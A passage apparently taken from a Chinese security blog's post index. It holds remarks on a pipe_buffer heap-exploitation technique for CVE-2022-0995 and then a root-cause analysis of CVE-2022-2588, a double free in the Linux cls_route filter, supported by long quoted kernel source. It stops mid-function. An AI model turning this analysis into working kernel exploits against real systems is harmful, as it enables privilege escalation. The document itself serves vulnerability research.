&lt; PIPE_NUM; i++)    &#123;        close(pipe_fd[i][0]);        close(pipe_fd[i][1]);    &#125;    return 0;&#125;\n\n\npipe_buffer？这里主要说的是 向pipe_buffer说yes! 这篇文章中的利用手法。\n不太推荐，不过需要修改一下type的值为0x306，如果继续保持0x30a的话结果是偏移0x400这样对于pipe_buffer来说过于大了，容易飞出去，所以修改到0x40效果更佳。(不过我不知道为什么每次申请的时候他都给我结尾为0x40和0xc0的，好像就是故意的🤮)\n\n虽然我们可以达到上图，但是在后续的利用中会出现一些问题，首先就是pipe对于申请数量的限制，超过510个时就出现了报错，这样会使成功率大打折扣。其次就是这里是页级的UAF，正如前面的所说，申请的数量较少那么我们在后续对pipe修改size分配堆块的时候从刚刚释放的页面内分配的概率又进一步减小了。当然，面对第二个问题我们可以事先分配很多object用于消耗内存中的slab。但是第一个问题却是硬伤无法解决，所以就我看来如果遇到页级的off by one/null这样的漏洞需要事先配置好堆风水的情况以外都不是特别推荐使用这一方法。\n\n参考链接:\n​    https://arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/\n​    https://elixir.bootlin.com/linux/v5.17-rc3/source\n","categories":["Linux Kernel","CVE复现"],"tags":["msg_msg","watch queue"]},{"title":"CVE-2022-2588复现","url":"/2023/10/27/CVE-2022-2588/","content":"前言本来不想分析CVE了，无奈前面提到了内核内部隔离机制，而在往期的文章中只在向pipe_buffer说yes！ 文章中简要提到过通过实现页级的UAF来实现绕过的，可是还存在一种技术可以绕过，如果不记录下来是真的心痒，所以只能把syzkaller的学习计划往后推推进而来分析这一个利用方法。文件创建时间是10月19号，不想写文章了，懒狗症犯了\n回到正题，这一漏洞出现在流量控制子系统包分类器的cls_route过滤器中，当旧过滤器的句柄为0时，在释放之前内核不会从哈希表中将其删除从而产生的Double Free。\nRtnetlink简述这里直接抄我参考文章的原文，绝对不是我懒得写\nRtnetlink是所有内核网络子系统使用的网络连接总线，包括网络接口、路由、fdb和邻居。一些内核网络子系统也在通用netlink总线上提供服务。Linux内核网络子系统使用消息类型和系列向Rtnetlink内核注册处理程序。Rtnetlink允许读取和更改内核的路由表。它在内核中用于在各种子系统之间进行通信，也用于与用户空间程序进行通信。网络路由、IP地址、链接参数、邻居设置、排队规则、流量类别和数据包分类器都可以通过NETLINK_ROUTE套接字进行控制。Rtnetlink由以下消息类型组成（除了标准的netlink消息）：\n\n  RTM_NEWLINK、RTM_DELLINK、RTM_GETLINK创建、删除或获取有关特定网络接口的信息。\n  RTM_NEWADDR、RTM_DELADDR、RTM_GETADDR添加、删除或接收有关与接口关联的IP地址的信息。\n  RTM_NEWROUTE、RTM_DELROUTE、RTM_GETROUTE创建、删除或接收有关网络路由的信息。\n  RTM_NEWNEIGH、RTM_DELNEIGH、RTM_GETNEIGH添加、删除或接收有关邻居表条目的信息（例如，ARP条目）。\n  RTM_NEWRULE、RTM_DELRULE、RTM_GETRULE添加、删除或检索路由规则。\n  RTM_NEWQDISC、RTM_DELQDISC、RTM_GETQDISC添加、删除或获取排队规则。\n  RTM_NEWTCLASS、RTM_DELTCLASS、RTM_GETTCLASS添加、删除或获取流量类别。\n  RTM_NEWTFILTER, RTM_DELTFILTER, RTM_GETTFILTER添加、删除或接收有关流量过滤器的信息。\n\n实现原理首先，当内核启动加载时会初始化netlink协议，此时会通过调用rtnetlink_init函数初始化路由netlink socket接口\nvoid __init rtnetlink_init(void)&#123;\tif (register_pernet_subsys(&amp;rtnetlink_net_ops))\t\tpanic(&quot;rtnetlink_init: cannot initialize rtnetlink\\n&quot;);\tregister_netdevice_notifier(&amp;rtnetlink_dev_notifier);\trtnl_register(PF_UNSPEC, RTM_GETLINK, rtnl_getlink,\t\t      rtnl_dump_ifinfo, 0);\trtnl_register(PF_UNSPEC, RTM_SETLINK, rtnl_setlink, NULL, 0);\trtnl_register(PF_UNSPEC, RTM_NEWLINK, rtnl_newlink, NULL, 0);\trtnl_register(PF_UNSPEC, RTM_DELLINK, rtnl_dellink, NULL, 0);\trtnl_register(PF_UNSPEC, RTM_GETADDR, NULL, rtnl_dump_all, 0);\trtnl_register(PF_UNSPEC, RTM_GETROUTE, NULL, rtnl_dump_all, 0);\trtnl_register(PF_UNSPEC, RTM_GETNETCONF, NULL, rtnl_dump_all, 0);\trtnl_register(PF_UNSPEC, RTM_NEWLINKPROP, rtnl_newlinkprop, NULL, 0);\trtnl_register(PF_UNSPEC, RTM_DELLINKPROP, rtnl_dellinkprop, NULL, 0);\trtnl_register(PF_BRIDGE, RTM_NEWNEIGH, rtnl_fdb_add, NULL, 0);\trtnl_register(PF_BRIDGE, RTM_DELNEIGH, rtnl_fdb_del, NULL,\t\t      RTNL_FLAG_BULK_DEL_SUPPORTED);\trtnl_register(PF_BRIDGE, RTM_GETNEIGH, rtnl_fdb_get, rtnl_fdb_dump, 0);\trtnl_register(PF_BRIDGE, RTM_GETLINK, NULL, rtnl_bridge_getlink, 0);\trtnl_register(PF_BRIDGE, RTM_DELLINK, rtnl_bridge_dellink, NULL, 0);\trtnl_register(PF_BRIDGE, RTM_SETLINK, rtnl_bridge_setlink, NULL, 0);\trtnl_register(PF_UNSPEC, RTM_GETSTATS, rtnl_stats_get, rtnl_stats_dump,\t\t      0);\trtnl_register(PF_UNSPEC, RTM_SETSTATS, rtnl_stats_set, NULL, 0);&#125;\n\n由上面的代码可以看出来的，主要是通过rtnl_register函数将不同的消息类型和对应的操作进行了绑定，这里简单看一下这个函数定义\nvoid rtnl_register(int protocol, int msgtype,\t\t   rtnl_doit_func doit, rtnl_dumpit_func dumpit,\t\t   unsigned int flags)&#123;\tint err;\terr = rtnl_register_internal(NULL, protocol, msgtype, doit, dumpit,\t\t\t\t     flags);\tif (err)\t\tpr_err(&quot;Unable to register rtnetlink message handler, &quot;\t\t       &quot;protocol = %d, message type = %d\\n&quot;, protocol, msgtype);&#125;\n\n可以发现这个函数其实就是rtnl_register_internal套了一层壳，这里主要关注rtnl_register的参数定义。前面就是协议，消息类型。紧随的这两个分别是两个毁掉函数被传入，而这两个毁掉函数对应的是两种类型，第一种是动作函数，第二种是dump函数dumpit，而从上面的初始化函数来看是有的消息只存在第一个有的只有第二个，还有的两者都有。从前面的简述中看到其实有的消息类型是没被初始化的比如RTM_NEWTFILTER，添加一个流量过滤器，其是在tc_filter_init函数中被初始化的\nstatic int __init tc_filter_init(void)&#123;\tint err;\ttc_filter_wq = alloc_ordered_workqueue(&quot;tc_filter_workqueue&quot;, 0);\tif (!tc_filter_wq)\t\treturn -ENOMEM;\terr = register_pernet_subsys(&amp;tcf_net_ops);\tif (err)\t\tgoto err_register_pernet_subsys;\trtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, NULL,\t\t      RTNL_FLAG_DOIT_UNLOCKED);\trtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, NULL,\t\t      RTNL_FLAG_DOIT_UNLOCKED);\trtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,\t\t      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);\trtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, NULL, 0);\trtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, NULL, 0);\trtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,\t\t      tc_dump_chain, 0);\treturn 0;err_register_pernet_subsys:\tdestroy_workqueue(tc_filter_wq);\treturn err;&#125;\n\n当用户通过NETLINK_ROUTE套接字发送RTM_NEWTFILTER消息用于创建一个流量过滤器时，内核会调用rtnetlink_rcv_msg函数来处理rtnetlink消息\nstatic int rtnetlink_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh,\t\t\t     struct netlink_ext_ack *extack)&#123;\tstruct net *net = sock_net(skb-&gt;sk);\tstruct rtnl_link *link;\tenum rtnl_kinds kind;\tstruct module *owner;\tint err = -EOPNOTSUPP;\trtnl_doit_func doit;\tunsigned int flags;\tint family;\tint type;\ttype = nlh-&gt;nlmsg_type;\tif (type &gt; RTM_MAX)\t\treturn -EOPNOTSUPP;\ttype -= RTM_BASE;\t/* All the messages must have at least 1 byte length */\tif (nlmsg_len(nlh) &lt; sizeof(struct rtgenmsg))\t\treturn 0;\tfamily = ((struct rtgenmsg *)nlmsg_data(nlh))-&gt;rtgen_family;\tkind = rtnl_msgtype_kind(type);\tif (kind != RTNL_KIND_GET &amp;&amp; !netlink_net_capable(skb, CAP_NET_ADMIN))\t\treturn -EPERM;\trcu_read_lock();\tif (kind == RTNL_KIND_GET &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP)) &#123;\t\tstruct sock *rtnl;\t\trtnl_dumpit_func dumpit;\t\tu32 min_dump_alloc = 0;\t\tlink = rtnl_get_link(family, type);\t\tif (!link || !link-&gt;dumpit) &#123;\t\t\tfamily = PF_UNSPEC;\t\t\tlink = rtnl_get_link(family, type);\t\t\tif (!link || !link-&gt;dumpit)\t\t\t\tgoto err_unlock;\t\t&#125;\t\towner = link-&gt;owner;\t\tdumpit = link-&gt;dumpit;\t\tif (type == RTM_GETLINK - RTM_BASE)\t\t\tmin_dump_alloc = rtnl_calcit(skb, nlh);\t\terr = 0;\t\t/* need to do this before rcu_read_unlock() */\t\tif (!try_module_get(owner))\t\t\terr = -EPROTONOSUPPORT;\t\trcu_read_unlock();\t\trtnl = net-&gt;rtnl;\t\tif (err == 0) &#123;\t\t\tstruct netlink_dump_control c = &#123;\t\t\t\t.dump\t\t= dumpit,\t\t\t\t.min_dump_alloc\t= min_dump_alloc,\t\t\t\t.module\t\t= owner,\t\t\t&#125;;\t\t\terr = netlink_dump_start(rtnl, skb, nlh, &amp;c);\t\t\t/* netlink_dump_start() will keep a reference on\t\t\t * module if dump is still in progress.\t\t\t */\t\t\tmodule_put(owner);\t\t&#125;\t\treturn err;\t&#125;\tlink = rtnl_get_link(family, type);\tif (!link || !link-&gt;doit) &#123;\t\tfamily = PF_UNSPEC;\t\tlink = rtnl_get_link(PF_UNSPEC, type);\t\tif (!link || !link-&gt;doit)\t\t\tgoto out_unlock;\t&#125;\towner = link-&gt;owner;\tif (!try_module_get(owner)) &#123;\t\terr = -EPROTONOSUPPORT;\t\tgoto out_unlock;\t&#125;\tflags = link-&gt;flags;\tif (kind == RTNL_KIND_DEL &amp;&amp; (nlh-&gt;nlmsg_flags &amp; NLM_F_BULK) &amp;&amp;\t    !(flags &amp; RTNL_FLAG_BULK_DEL_SUPPORTED)) &#123;\t\tNL_SET_ERR_MSG(extack, &quot;Bulk delete is not supported&quot;);\t\tgoto err_unlock;\t&#125;\tif (flags &amp; RTNL_FLAG_DOIT_UNLOCKED) &#123;\t\tdoit = link-&gt;doit;\t\trcu_read_unlock();\t\tif (doit)\t\t\terr = doit(skb, nlh, extack);\t\tmodule_put(owner);\t\treturn err;\t&#125;\trcu_read_unlock();\trtnl_lock();\tlink = rtnl_get_link(family, type);\tif (link &amp;&amp; link-&gt;doit)\t\terr = link-&gt;doit(skb, nlh, extack);\trtnl_unlock();\tmodule_put(owner);\treturn err;out_unlock:\trcu_read_unlock();\treturn err;err_unlock:\trcu_read_unlock();\treturn -EOPNOTSUPP;&#125;\n\n可以看到函数的主要逻辑，首先是在消息中取出其family和type，紧接着根绝family和type回去到link。在最后调用link-&gt;doit(skb, nlh, extack)，由前面的函数可以得知的是其会调用如下函数\nstatic int tc_new_tfilter(struct sk_buff *skb, struct nlmsghdr *n,\t\t\t  struct netlink_ext_ack *extack)&#123;\tstruct net *net = sock_net(skb-&gt;sk);\tstruct nlattr *tca[TCA_MAX + 1];\tchar name[IFNAMSIZ];\tstruct tcmsg *t;\tu32 protocol;\tu32 prio;\tbool prio_allocate;\tu32 parent;\tu32 chain_index;\tstruct Qdisc *q;\tstruct tcf_chain_info chain_info;\tstruct tcf_chain *chain;\tstruct tcf_block *block;\tstruct tcf_proto *tp;\tunsigned long cl;\tvoid *fh;\tint err;\tint tp_created;\tbool rtnl_held = false;\tu32 flags;\tif (!netlink_ns_capable(skb, net-&gt;user_ns, CAP_NET_ADMIN))\t\treturn -EPERM;replay:\ttp_created = 0;\terr = nlmsg_parse_deprecated(n, sizeof(*t), tca, TCA_MAX,\t\t\t\t     rtm_tca_policy, extack);\tif (err &lt; 0)\t\treturn err;\tt = nlmsg_data(n);\tprotocol = TC_H_MIN(t-&gt;tcm_info);\tprio = TC_H_MAJ(t-&gt;tcm_info);\tprio_allocate = false;\tparent = t-&gt;tcm_parent;\ttp = NULL;\tcl = 0;\tblock = NULL;\tq = NULL;\tchain = NULL;\tflags = 0;\tif (prio == 0) &#123;\t\t/* If no priority is provided by the user,\t\t * we allocate one.\t\t */\t\tif (n-&gt;nlmsg_flags &amp; NLM_F_CREATE) &#123;\t\t\tprio = TC_H_MAKE(0x80000000U, 0U);\t\t\tprio_allocate = true;\t\t&#125; else &#123;\t\t\tNL_SET_ERR_MSG(extack, &quot;Invalid filter command with priority of zero&quot;);\t\t\treturn -ENOENT;\t\t&#125;\t&#125;\t/* Find head of filter chain. */\terr = __tcf_qdisc_find(net, &amp;q, &amp;parent, t-&gt;tcm_ifindex, false, extack);\tif (err)\t\treturn err;\tif (tcf_proto_check_kind(tca[TCA_KIND], name)) &#123;\t\tNL_SET_ERR_MSG(extack, &quot;Specified TC filter name too long&quot;);\t\terr = -EINVAL;\t\tgoto errout;\t&#125;\t/* Take rtnl mutex if rtnl_held was set to true on previous iteration,\t * block is shared (no qdisc found), qdisc is not unlocked, classifier\t * type is not specified, classifier is not unlocked.\t */\tif (rtnl_held ||\t    (q &amp;&amp; !(q-&gt;ops-&gt;cl_ops-&gt;flags &amp; QDISC_CLASS_OPS_DOIT_UNLOCKED)) ||\t    !tcf_proto_is_unlocked(name)) &#123;\t\trtnl_held = true;\t\trtnl_lock();\t&#125;\terr = __tcf_qdisc_cl_find(q, parent, &amp;cl, t-&gt;tcm_ifindex, extack);\tif (err)\t\tgoto errout;\tblock = __tcf_block_find(net, q, cl, t-&gt;tcm_ifindex, t-&gt;tcm_block_index,\t\t\t\t extack);\tif (IS_ERR(block)) &#123;\t\terr = PTR_ERR(block);\t\tgoto errout;\t&#125;\tblock-&gt;classid = parent;\tchain_index = tca[TCA_CHAIN] ? nla_get_u32(tca[TCA_CHAIN]) : 0;\tif (chain_index &gt; TC_ACT_EXT_VAL_MASK) &#123;\t\tNL_SET_ERR_MSG(extack, &quot;Specified chain index exceeds upper limit&quot;);\t\terr = -EINVAL;\t\tgoto errout;\t&#125;\tchain = tcf_chain_get(block, chain_index, true);\tif (!chain) &#123;\t\tNL_SET_ERR_MSG(extack, &quot;Cannot create specified filter chain&quot;);\t\terr = -ENOMEM;\t\tgoto errout;\t&#125;\tmutex_lock(&amp;chain-&gt;filter_chain_lock);\ttp = tcf_chain_tp_find(chain, &amp;chain_info, protocol,\t\t\t       prio, prio_allocate);\tif (IS_ERR(tp)) &#123;\t\tNL_SET_ERR_MSG(extack, &quot;Filter with specified priority/protocol not found&quot;);\t\terr = PTR_ERR(tp);\t\tgoto errout_locked;\t&#125;\tif (tp == NULL) &#123;\t\tstruct tcf_proto *tp_new = NULL;\t\tif (chain-&gt;flushing) &#123;\t\t\terr = -EAGAIN;\t\t\tgoto errout_locked;\t\t&#125;\t\t/* Proto-tcf does not exist, create new one */\t\tif (tca[TCA_KIND] == NULL || !protocol) &#123;\t\t\tNL_SET_ERR_MSG(extack, &quot;Filter kind and protocol must be specified&quot;);\t\t\terr = -EINVAL;\t\t\tgoto errout_locked;\t\t&#125;\t\tif (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;\t\t\tNL_SET_ERR_MSG(extack, &quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;);\t\t\terr = -ENOENT;\t\t\tgoto errout_locked;\t\t&#125;\t\tif (prio_allocate)\t\t\tprio = tcf_auto_prio(tcf_chain_tp_prev(chain,\t\t\t\t\t\t\t       &amp;chain_info));\t\tmutex_unlock(&amp;chain-&gt;filter_chain_lock);\t\ttp_new = tcf_proto_create(name, protocol, prio, chain,\t\t\t\t\t  rtnl_held, extack);\t\tif (IS_ERR(tp_new)) &#123;\t\t\terr = PTR_ERR(tp_new);\t\t\tgoto errout_tp;\t\t&#125;\t\ttp_created = 1;\t\ttp = tcf_chain_tp_insert_unique(chain, tp_new, protocol, prio,\t\t\t\t\t\trtnl_held);\t\tif (IS_ERR(tp)) &#123;\t\t\terr = PTR_ERR(tp);\t\t\tgoto errout_tp;\t\t&#125;\t&#125; else &#123;\t\tmutex_unlock(&amp;chain-&gt;filter_chain_lock);\t&#125;\tif (tca[TCA_KIND] &amp;&amp; nla_strcmp(tca[TCA_KIND], tp-&gt;ops-&gt;kind)) &#123;\t\tNL_SET_ERR_MSG(extack, &quot;Specified filter kind does not match existing one&quot;);\t\terr = -EINVAL;\t\tgoto errout;\t&#125;\tfh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle);\tif (!fh) &#123;\t\tif (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE)) &#123;\t\t\tNL_SET_ERR_MSG(extack, &quot;Need both RTM_NEWTFILTER and NLM_F_CREATE to create a new filter&quot;);\t\t\terr = -ENOENT;\t\t\tgoto errout;\t\t&#125;\t&#125; else if (n-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;\t\ttfilter_put(tp, fh);\t\tNL_SET_ERR_MSG(extack, &quot;Filter already exists&quot;);\t\terr = -EEXIST;\t\tgoto errout;\t&#125;\tif (chain-&gt;tmplt_ops &amp;&amp; chain-&gt;tmplt_ops != tp-&gt;ops) &#123;\t\tNL_SET_ERR_MSG(extack, &quot;Chain template is set to a different filter kind&quot;);\t\terr = -EINVAL;\t\tgoto errout;\t&#125;\tif (!(n-&gt;nlmsg_flags &amp; NLM_F_CREATE))\t\tflags |= TCA_ACT_FLAGS_REPLACE;\tif (!rtnl_held)\t\tflags |= TCA_ACT_FLAGS_NO_RTNL;\terr = tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh,\t\t\t      flags, extack);\tif (err == 0) &#123;\t\ttfilter_notify(net, skb, n, tp, block, q, parent, fh,\t\t\t       RTM_NEWTFILTER, false, rtnl_held);\t\ttfilter_put(tp, fh);\t\t/* q pointer is NULL for shared blocks */\t\tif (q)\t\t\tq-&gt;flags &amp;= ~TCQ_F_CAN_BYPASS;\t&#125;errout:\tif (err &amp;&amp; tp_created)\t\ttcf_chain_tp_delete_empty(chain, tp, rtnl_held, NULL);errout_tp:\tif (chain) &#123;\t\tif (tp &amp;&amp; !IS_ERR(tp))\t\t\ttcf_proto_put(tp, rtnl_held, NULL);\t\tif (!tp_created)\t\t\ttcf_chain_put(chain);\t&#125;\ttcf_block_release(q, block, rtnl_held);\tif (rtnl_held)\t\trtnl_unlock();\tif (err == -EAGAIN) &#123;\t\t/* Take rtnl lock in case EAGAIN is caused by concurrent flush\t\t * of target chain.\t\t */\t\trtnl_held = true;\t\t/* Replay the request. */\t\tgoto replay;\t&#125;\treturn err;errout_locked:\tmutex_unlock(&amp;chain-&gt;filter_chain_lock);\tgoto errout;&#125;\n\n这里简单说一下上面函数的逻辑，首先通过tcf_proto_check_kind(tca[TCA_KIND], name)获取过滤器的名字，随后通过tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol, prio, prio_allocate)获取指定协议的过滤器tp，如果tp为null则会创建新的tp，这里通过tp_new = tcf_proto_create(name, protocol, prio, chain, rtnl_held, extack);函数进行创建\nstatic struct tcf_proto *tcf_proto_create(const char *kind, u32 protocol,\t\t\t\t\t  u32 prio, struct tcf_chain *chain,\t\t\t\t\t  bool rtnl_held,\t\t\t\t\t  struct netlink_ext_ack *extack)&#123;\tstruct tcf_proto *tp;\tint err;\ttp = kzalloc(sizeof(*tp), GFP_KERNEL);\tif (!tp)\t\treturn ERR_PTR(-ENOBUFS);\ttp-&gt;ops = tcf_proto_lookup_ops(kind, rtnl_held, extack);\tif (IS_ERR(tp-&gt;ops)) &#123;\t\terr = PTR_ERR(tp-&gt;ops);\t\tgoto errout;\t&#125;\ttp-&gt;classify = tp-&gt;ops-&gt;classify;\ttp-&gt;protocol = protocol;\ttp-&gt;prio = prio;\ttp-&gt;chain = chain;\tspin_lock_init(&amp;tp-&gt;lock);\trefcount_set(&amp;tp-&gt;refcnt, 1);\terr = tp-&gt;ops-&gt;init(tp);\tif (err) &#123;\t\tmodule_put(tp-&gt;ops-&gt;owner);\t\tgoto errout;\t&#125;\treturn tp;errout:\tkfree(tp);\treturn ERR_PTR(err);&#125;\n\n首先是为tp分配了一个object随后通过tcf_proto_lookup_ops函数根据kind获取到对应的ops\nstatic const struct tcf_proto_ops *__tcf_proto_lookup_ops(const char *kind)&#123;\tconst struct tcf_proto_ops *t, *res = NULL;\tif (kind) &#123;\t\tread_lock(&amp;cls_mod_lock);\t\tlist_for_each_entry(t, &amp;tcf_proto_base, head) &#123;\t\t\tif (strcmp(kind, t-&gt;kind) == 0) &#123;\t\t\t\tif (try_module_get(t-&gt;owner))\t\t\t\t\tres = t;\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t\tread_unlock(&amp;cls_mod_lock);\t&#125;\treturn res;&#125;\n\n这里以route为例子\nstatic struct tcf_proto_ops cls_route4_ops __read_mostly = &#123;\t.kind\t\t=\t&quot;route&quot;,\t.classify\t=\troute4_classify,\t.init\t\t=\troute4_init,\t.destroy\t=\troute4_destroy,\t.get\t\t=\troute4_get,\t.change\t\t=\troute4_change,\t.delete\t\t=\troute4_delete,\t.walk\t\t=\troute4_walk,\t.dump\t\t=\troute4_dump,\t.bind_class\t=\troute4_bind_class,\t.owner\t\t=\tTHIS_MODULE,&#125;;\n\n上面的ops将会获得如上cls_route4_ops结构体随后会调用tp-&gt;ops-&gt;init(tp)进行初始化\nstatic int route4_init(struct tcf_proto *tp)&#123;\tstruct route4_head *head;\thead = kzalloc(sizeof(struct route4_head), GFP_KERNEL);\tif (head == NULL)\t\treturn -ENOBUFS;\trcu_assign_pointer(tp-&gt;root, head);\treturn 0;&#125;\n\n可以看到该函数会生成一个route4_head结构体，此结构体的作用是用于存放过滤器对应的哈希值。\n接着回到tc_new_tfilter函数，其会将新生成的tp加入到chain中。接下来就会通过fh = tp-&gt;ops-&gt;get(tp, t-&gt;tcm_handle)语句调用对应的get函数，根据tcm_handle获取到过滤器\nstatic void *route4_get(struct tcf_proto *tp, u32 handle)&#123;\tstruct route4_head *head = rtnl_dereference(tp-&gt;root);\tstruct route4_bucket *b;\tstruct route4_filter *f;\tunsigned int h1, h2;\th1 = to_hash(handle);\tif (h1 &gt; 256)\t\treturn NULL;\th2 = from_hash(handle &gt;&gt; 16);\tif (h2 &gt; 32)\t\treturn NULL;\tb = rtnl_dereference(head-&gt;table[h1]);\tif (b) &#123;\t\tfor (f = rtnl_dereference(b-&gt;ht[h2]);\t\t     f;\t\t     f = rtnl_dereference(f-&gt;next))\t\t\tif (f-&gt;handle == handle)\t\t\t\treturn f;\t&#125;\treturn NULL;&#125;\n\n这里会根据handle从route4_head链表中获取对应的route4_filter。如果返回为空，会接着进入到tc_new_tfilter函数的后续流程，最终在tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh, flags, extack)语句调用change函数创建一个新的过滤器。\n漏洞分析漏洞出现在route4_change函数中\nstatic int route4_change(struct net *net, struct sk_buff *in_skb,\t\t\t struct tcf_proto *tp, unsigned long base, u32 handle,\t\t\t struct nlattr **tca, void **arg, u32 flags,\t\t\t struct netlink_ext_ack *extack)&#123;\tstruct route4_head *head = rtnl_dereference(tp-&gt;root);\tstruct route4_filter __rcu **fp;\tstruct route4_filter *fold, *f1, *pfp, *f = NULL;\tstruct route4_bucket *b;\tstruct nlattr *opt = tca[TCA_OPTIONS];\tstruct nlattr *tb[TCA_ROUTE4_MAX + 1];\tunsigned int h, th;\tint err;\tbool new = true;\tif (opt == NULL)\t\treturn handle ? -EINVAL : 0;\terr = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,\t\t\t\t\t  route4_policy, NULL);\tif (err &lt; 0)\t\treturn err;\tfold = *arg;\tif (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)\t\t\treturn -EINVAL;\terr = -ENOBUFS;\tf = kzalloc(sizeof(struct route4_filter), GFP_KERNEL);\tif (!f)\t\tgoto errout;\terr = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE);\tif (err &lt; 0)\t\tgoto errout;\tif (fold) &#123;\t\tf-&gt;id = fold-&gt;id;\t\tf-&gt;iif = fold-&gt;iif;\t\tf-&gt;res = fold-&gt;res;\t\tf-&gt;handle = fold-&gt;handle;\t\tf-&gt;tp = fold-&gt;tp;\t\tf-&gt;bkt = fold-&gt;bkt;\t\tnew = false;\t&#125;\terr = route4_set_parms(net, tp, base, f, handle, head, tb,\t\t\t       tca[TCA_RATE], new, flags, extack);\tif (err &lt; 0)\t\tgoto errout;\th = from_hash(f-&gt;handle &gt;&gt; 16);\tfp = &amp;f-&gt;bkt-&gt;ht[h];\tfor (pfp = rtnl_dereference(*fp);\t     (f1 = rtnl_dereference(*fp)) != NULL;\t     fp = &amp;f1-&gt;next)\t\tif (f-&gt;handle &lt; f1-&gt;handle)\t\t\tbreak;\ttcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);\trcu_assign_pointer(f-&gt;next, f1);\trcu_assign_pointer(*fp, f);\tif (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;\t\tth = to_hash(fold-&gt;handle);\t\th = from_hash(fold-&gt;handle &gt;&gt; 16);\t\tb = rtnl_dereference(head-&gt;table[th]);\t\tif (b) &#123;\t\t\tfp = &amp;b-&gt;ht[h];\t\t\tfor (pfp = rtnl_dereference(*fp); pfp;\t\t\t     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;\t\t\t\tif (pfp == fold) &#123;\t\t\t\t\trcu_assign_pointer(*fp, fold-&gt;next);\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\troute4_reset_fastmap(head);\t*arg = f;\tif (fold) &#123;\t\ttcf_unbind_filter(tp, &amp;fold-&gt;res);\t\ttcf_exts_get_net(&amp;fold-&gt;exts);\t\ttcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);\t&#125;\treturn 0;errout:\tif (f)\t\ttcf_exts_destroy(&amp;f-&gt;exts);\tkfree(f);\treturn err;&#125;\n\n简单分析一下，这里会进一步解析数据包，通过fold = *arg;语句拿出route4_filter，然后判断是否存在，是否handle，handle是否一致，因为是第一次创建这里的fold为空。接着会通过f = kzalloc(sizeof(struct route4_filter), GFP_KERNEL)创建一个结构体，并对其调用tcf_exts_init函数进行初始化\nstatic inline int tcf_exts_init(struct tcf_exts *exts, struct net *net,\t\t\t\tint action, int police)&#123;#ifdef CONFIG_NET_CLS_ACT\texts-&gt;type = 0;\texts-&gt;nr_actions = 0;\t/* Note: we do not own yet a reference on net.\t * This reference might be taken later from tcf_exts_get_net().\t */\texts-&gt;net = net;\texts-&gt;actions = kcalloc(TCA_ACT_MAX_PRIO, sizeof(struct tc_action *),\t\t\t\tGFP_KERNEL);\tif (!exts-&gt;actions)\t\treturn -ENOMEM;#endif\texts-&gt;action = action;\texts-&gt;police = police;\treturn 0;&#125;\n\n从上述看书可以看到如果内核开启了CONFIG_NET_CLS_ACT选项就会对其分配actions成员，分配的大小是256字节。完毕之后回到route4_change中，如果fold存在，则会将其数据域复制给f。随后调用route4_set_parms函数设置其他参数，后面将新创建的route4_filter的hash值放到对应的route4_head中。\n接下来进入if (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;分支中删除掉旧的route4_filter的哈希值，当然在第一次运行时这里是不会进入的。\n在最后判断fold是否为空，如果不为空则调用tcf_queue_work函数对其进行释放操作\nbool tcf_queue_work(struct rcu_work *rwork, work_func_t func)&#123;\tINIT_RCU_WORK(rwork, func);\treturn queue_rcu_work(tc_filter_wq, rwork);&#125;EXPORT_SYMBOL(tcf_queue_work);\n\n这个函数是个rcu回调，这里就看他的回调函数即可\nstatic void __route4_delete_filter(struct route4_filter *f)&#123;\ttcf_exts_destroy(&amp;f-&gt;exts);\ttcf_exts_put_net(&amp;f-&gt;exts);\tkfree(f);&#125;static void route4_delete_filter_work(struct work_struct *work)&#123;\tstruct route4_filter *f = container_of(to_rcu_work(work),\t\t\t\t\t       struct route4_filter,\t\t\t\t\t       rwork);\trtnl_lock();\t__route4_delete_filter(f);\trtnl_unlock();&#125;\n\n可以其函数实现就是删除对应的成员之后删除掉f。\n通过上述流程看起来还是蛮正常的，这里出现问题的地方在清除hash和最后释放结构体的if条件不一致导致的。可以注意到的是在前面清楚哈希值时会判断其handle是否存在，如果不存在则不会进入。但是后面只是判断了fold是否存在，如果我们创建一个handle为0的过滤器则不会进入到上面的分支中只会进入到下面的分支中，从而导致其索引还残留在route4_head中。\nstatic int route4_delete(struct tcf_proto *tp, void *arg, bool *last,\t\t\t bool rtnl_held, struct netlink_ext_ack *extack)&#123;\tstruct route4_head *head = rtnl_dereference(tp-&gt;root);\tstruct route4_filter *f = arg;\tstruct route4_filter __rcu **fp;\tstruct route4_filter *nf;\tstruct route4_bucket *b;\tunsigned int h = 0;\tint i, h1;\tif (!head || !f)\t\treturn -EINVAL;\th = f-&gt;handle;\tb = f-&gt;bkt;\tfp = &amp;b-&gt;ht[from_hash(h &gt;&gt; 16)];\tfor (nf = rtnl_dereference(*fp); nf;\t     fp = &amp;nf-&gt;next, 